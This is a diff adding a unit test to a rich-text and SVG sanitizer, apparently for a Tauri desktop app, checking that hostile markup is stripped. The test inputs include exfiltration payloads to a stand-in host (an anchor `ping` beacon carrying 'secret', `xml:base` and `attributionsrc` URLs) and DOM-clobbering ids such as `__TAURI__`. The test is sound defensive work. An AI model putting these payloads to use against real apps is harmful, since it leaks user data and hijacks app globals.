@@ -103,6 +103,22 @@ describe('sanitizeRichText', () => {
     expect(out).not.toMatch(/javascript:/i);
     expect(out).toContain('click');
   });
+
+  it('takes off what the renderer takes off a tag: requests the browser makes itself, and the host’s names', () => {
+    // `ping="/x https://…"` was judged as one relative URL and kept, and a
+    // click beaconed the second to any host, from an app with no `net`.
+    const noNet = markupUrlJudge({ permissions: {} });
+    const pinged = sanitizeRichText('<a ping="/x https://attacker.example/t?d=secret" href="/dest">x</a>', noNet);
+    expect(pinged).not.toMatch(/ping|attacker/i);
+    expect(pinged).toContain('href="/dest"');
+    // An element answers to its id as a global of the window: `__TAURI__` was the app's.
+    const named = sanitizeRichText('<a id="__TAURI__">x</a><p id="kept">y</p><img name="__x" src="/a.png">');
+    expect(named).not.toContain('__');
+    expect(named).toContain('id="kept"');
+    const svg = sanitizeSvg('<svg id="__proof" xml:base="https://attacker.example/"><path d="M0 0"/></svg>');
+    expect(svg).not.toMatch(/__proof|xml:base/);
+    expect(sanitizeRichText('<div is="x-y" attributionsrc="https://attacker.example/a">z</div>')).not.toMatch(/\bis=|attributionsrc/);
+  });
 });
 
 describe('isSafeUrl', () => {
